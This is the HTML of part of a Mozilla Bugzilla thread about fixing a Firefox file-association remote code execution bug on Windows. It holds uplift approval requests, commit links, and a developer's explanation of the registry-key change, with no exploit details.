          <button type="button" class="change-spinner minor iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-13 12:35 PST" data-time="1578947708">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-29" data-comment-id="14590027" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/integration/autoland/rev/1bfc604fa210" rel="nofollow">https://hg.mozilla.org/integration/autoland/rev/1bfc604fa210</a></p>
</div></div><div class="change-set" id="c30"><div class="comment" data-id="14590077" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a473666_600971"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-13 12:52 PST" data-time="1578948772">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-30" data-comment-id="14590077" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9119189" name="attach_9119189" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">attachment 9119189</a> <a href="/attachment.cgi?id=9119189&amp;action=edit" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">Bug 1606596</a> - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin</p>
<h3>Beta/Release Uplift Approval Request</h3>
<ul>
<li><strong>User impact if declined</strong>: Exposure to remote code execution at the user&#39;s privilege level upon clicking a link, provided the client machine is already configured with at least one manually created file type association.</li>
<li><strong>Is this code covered by automated tests?</strong>: No</li>
<li><strong>Has the fix been verified in Nightly?</strong>: Yes</li>
<li><strong>Needs manual test from QE?</strong>: No</li>
<li><strong>If yes, steps to reproduce</strong>:</li>
<li><strong>List of other uplifts needed</strong>: None</li>
<li><strong>Risk to taking this patch</strong>: Low</li>
<li><strong>Why is the change risky/not risky? (and alternatives if risky)</strong>: I&#39;m confident in this patch. There are some known limitations and drawbacks which are discussed in the review, but regression risk should be minimal because the patch involves a set of file association configurations that is separate from the ones the installer otherwise creates and manipulates (which include the common web page file types), so regressing those is very unlikely. It&#39;s also been manually tested by myself and the reviewer.</li>
<li><strong>String changes made/needed</strong>: N/A</li>
</ul>
<h3>ESR Uplift Approval Request</h3>
<ul>
<li><strong>If this is not a sec:{high,crit} bug, please state case for ESR consideration</strong>: This is a sec-high bug.</li>
<li><strong>User impact if declined</strong>: Exposure to remote code execution at the user&#39;s privilege level upon clicking a link, provided the client machine is already configured with at least one manually created file type association.</li>
<li><strong>Fix Landed on Version</strong>: 74</li>
<li><strong>Risk to taking this patch</strong>: Low</li>
<li><strong>Why is the change risky/not risky? (and alternatives if risky)</strong>: I&#39;m confident in this patch. There are some known limitations and drawbacks which are discussed in the review, but regression risk should be minimal because the patch involves a set of file association configurations that is separate from the ones the installer otherwise creates and manipulates (which include the common web page file types), so regressing those is very unlikely. It&#39;s also been manually tested by myself and the reviewer.</li>
<li><strong>String or UUID changes made by this patch</strong>: N/A</li>
</ul>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9119189&amp;action=edit"
           title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin"
           class=""
        >Attachment #9119189</a> -
        Flags: approval-mozilla-release?</div><div class="change">
        <a href="/attachment.cgi?id=9119189&amp;action=edit"
           title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin"
           class=""
        >Attachment #9119189</a> -
        Flags: approval-mozilla-esr68?</div><div class="change">
        <a href="/attachment.cgi?id=9119189&amp;action=edit"
           title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin"
           class=""
        >Attachment #9119189</a> -
        Flags: approval-mozilla-beta?</div></div></div><div class="change-set" id="c31"><div class="comment" data-id="14590926" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_258347" id="a473666_600971"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_258347" id="a473666_600971"><a class="email " href="/user_profile?user_id=258347" > <span class="fna">Sebastian Hengst [:aryx] (needinfo on intermittent or backout)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-14 01:21 PST" data-time="1578993686">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-31" data-comment-id="14590926" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/mozilla-central/rev/1bfc604fa210" rel="nofollow">https://hg.mozilla.org/mozilla-central/rev/1bfc604fa210</a></p>
</div><div class="activity"><div class="change">Group: firefox-core-security &rarr; core-security-release</div><div class="change">Status: UNCONFIRMED &rarr; RESOLVED</div><div class="change">Closed: <span class="rel-time" title="2020-01-14 01:21 PST" data-time="1578993686">2 years ago</span></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox74&amp;o1=isnotempty">status-firefox74</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox74&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">Resolution: --- &rarr; FIXED</div><div class="change">Target Milestone: --- &rarr; Firefox 74</div></div></div><div class="change-set" id="c32"><div class="comment" data-id="14592324" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a473666_600971"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-14 11:00 PST" data-time="1579028418">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-32" data-comment-id="14592324" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9119189" name="attach_9119189" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">attachment 9119189</a> <a href="/attachment.cgi?id=9119189&amp;action=edit" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">Bug 1606596</a> - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin</p>
<p>Approved for 73.0b5 so we can get some wider testing.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9119189&amp;action=edit"
           title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin"
           class=""
        >Attachment #9119189</a> -
        Flags: approval-mozilla-beta? &rarr; approval-mozilla-beta+</div></div></div><div class="change-set" id="c33"><div class="comment" data-id="14592339" data-no="33"
       data-tags="uplift">
    
    <table class="layout-table change-head " id="ch-33" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a473666_600971"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c33">Comment 33</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-14 11:05 PST" data-time="1579028742">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags"><span class="comment-tag">uplift</span>
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-33" data-comment-id="14592339" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/releases/mozilla-beta/rev/34a98c5e4134" rel="nofollow">https://hg.mozilla.org/releases/mozilla-beta/rev/34a98c5e4134</a></p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=isnotempty">status-firefox72</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox73&amp;o1=isnotempty">status-firefox73</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox73&amp;o1=equals&amp;v1=fixed">fixed</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=isnotempty">status-firefox-esr68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox73&amp;o1=isnotempty">tracking-firefox73</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox73&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox74&amp;o1=isnotempty">tracking-firefox74</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox74&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=isnotempty">tracking-firefox-esr68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=equals&amp;v1=73%2B">73+</a></div></div></div><div class="change-set" id="c34"><div class="comment" data-id="14597650" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_580382" id="a473666_600971"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-17 06:33 PST" data-time="1579271609">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-34" data-comment-id="14597650" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9119189" name="attach_9119189" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">attachment 9119189</a> <a href="/attachment.cgi?id=9119189&amp;action=edit" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">Bug 1606596</a> - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin</p>
<p>I&#39;d rather not take this in a dot release, it can go out with 73 in a few weeks.</p>
</div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=9119189&amp;action=edit"
           title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin"
           class=""
        >Attachment #9119189</a> -
        Flags: approval-mozilla-release? &rarr; approval-mozilla-release-</div></div></div><div class="change-set" id="a1319936_580382"><div class="change" id="aa1319936_580382">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a1319936_580382"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_580382" id="a1319936_580382"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1319936_580382"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1319936_580382">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a1319936_580382">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-17 06:33 PST" data-time="1579271619">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=isnotempty">status-firefox72</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="a1322679_458188"><div class="change" id="aa1322679_458188">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458188" id="a1322679_458188"><img src="https://secure.gravatar.com/avatar/8f3f8c3f93e13fdf486474e1382bf53e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_458188" id="a1322679_458188"><a class="email " href="/user_profile?user_id=458188" > <span class="fna">PTO until 15th Nov [:bogdan_maris], Release Desktop QA</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a1322679_458188"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a1322679_458188">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a1322679_458188">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-17 07:19 PST" data-time="1579274362">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: qe-verify-</div><div class="change">Whiteboard: [reporter-external] [client-bounty-form] [verif?] &rarr; [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage]</div></div></div><div class="change-set" id="c35"><div class="comment" data-id="14604430" data-no="35"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a1322679_458188"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a1322679_458188"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-21 17:33 PST" data-time="1579656830">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-35" data-comment-id="14604430" data-ismarkdown="true" ><p>Comment on <span class=""><a href="/attachment.cgi?id=9119189" name="attach_9119189" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">attachment 9119189</a> <a href="/attachment.cgi?id=9119189&amp;action=edit" title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin">[details]</a></span><br>
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">Bug 1606596</a> - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin</p>
<p>Approved for 68.5esr. I&#39;m a bit worried about potential enterprise fallout, though. Mike, are you aware of anything in particular we might want to test with this before shipping in 2 weeks?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(mozilla)</div><div class="change">
        <a href="/attachment.cgi?id=9119189&amp;action=edit"
           title="Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin"
           class=""
        >Attachment #9119189</a> -
        Flags: approval-mozilla-esr68? &rarr; approval-mozilla-esr68+</div></div></div><div class="change-set" id="c36"><div class="comment" data-id="14604438" data-no="36"
       data-tags="uplift">
    
    <table class="layout-table change-head " id="ch-36" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a1322679_458188"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a1322679_458188"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-36"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-36" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c36">Comment 36</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-21 17:39 PST" data-time="1579657144">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-36">
        <td colspan="2" class="comment-tags"><span class="comment-tag">uplift</span>
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-36" data-comment-id="14604438" data-ismarkdown="true" ><p><a href="https://hg.mozilla.org/releases/mozilla-esr68/rev/b25bc5d633fe" rel="nofollow">https://hg.mozilla.org/releases/mozilla-esr68/rev/b25bc5d633fe</a></p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=isnotempty">status-firefox-esr68</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="c37"><div class="comment" data-id="14604467" data-no="37"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7313" id="a1322679_458188"><img src="https://secure.gravatar.com/avatar/dc84c7d304a23e0a62a86580dd08c587?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_7313" id="a1322679_458188"><a class="email " href="/user_profile?user_id=7313" > <span class="fna">Mike Kaply [:mkaply]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-21 18:15 PST" data-time="1579659352">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-37" data-comment-id="14604467" data-ismarkdown="true" ><p>I honestly don&#39;t have a good sense of what this fix exactly does.</p>
<p>What we&#39;re going to need to do is explain it really well so we can determine if it will cause any issues.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(mozilla)</span></div></div></div><div class="change-set" id="c38"><div class="comment" data-id="14605440" data-no="38"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a1322679_458188"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a1322679_458188"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-38"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-38" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c38">Comment 38</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-22 08:15 PST" data-time="1579709739">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-38">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-38" data-comment-id="14605440" data-ismarkdown="true" ><p>The most noticeable user-visible effect of this change is that we&#39;ll be listed in the Open With dialog for every file type, but &quot;below the fold&quot; for types we don&#39;t claim to support (meaning you have to expand the More Apps section to see it). This is a side-effect of the actual intended fix.</p>
<p>The actual intended fix is to replace the registry key that the Open With dialog creates when you manually associate us with a file type we don&#39;t claim support for (<code>.pdf</code> is the most common example), which we need to do because the default command line it writes into that key is insecure. So, the other effect this patch might have is that if anyone has customized any of the values we&#39;re going to write in <code>HKEY_CLASSES_ROOT\Applications\firefox.exe</code>, then those customization will be overwritten. This includes the command line string, the default icon, and the supported file types, but not any of the more common things that tend to get customized in that key, like <code>NoStartPage</code>, so those won&#39;t be affected. The uninstaller will remove the entire key if the command line points to the copy being uninstalled, though.</p>
<p>I think that covers it. I know it&#39;s complicated and subtle, but <code>HKCR</code> is like that.</p>
</div></div><div class="change-set" id="c39"><div class="comment" data-id="14605548" data-no="39"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-39" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_7313" id="a1322679_458188"><img src="https://secure.gravatar.com/avatar/dc84c7d304a23e0a62a86580dd08c587?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_7313" id="a1322679_458188"><a class="email " href="/user_profile?user_id=7313" > <span class="fna">Mike Kaply [:mkaply]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-39"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-39" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c39">Comment 39</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-22 08:49 PST" data-time="1579711759">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-39">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-39" data-comment-id="14605548" data-ismarkdown="true" ><p>Is that true of other browsers as well? Or is this problem unique to us, and so is the workaround?</p>
</div></div><div class="change-set" id="c40"><div class="comment" data-id="14605565" data-no="40"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-40" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a1322679_458188"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a1322679_458188"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-40"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-40" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c40">Comment 40</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-22 08:52 PST" data-time="1579711974">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-40">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-40" data-comment-id="14605565" data-ismarkdown="true" ><p>The reporter here indicated that Chrome had a similar bug but patched it a few months ago, but I wasn&#39;t able to see the patch myself; see the ends of <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c5" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment 5</a> and <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c6" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment 6</a>.</p>
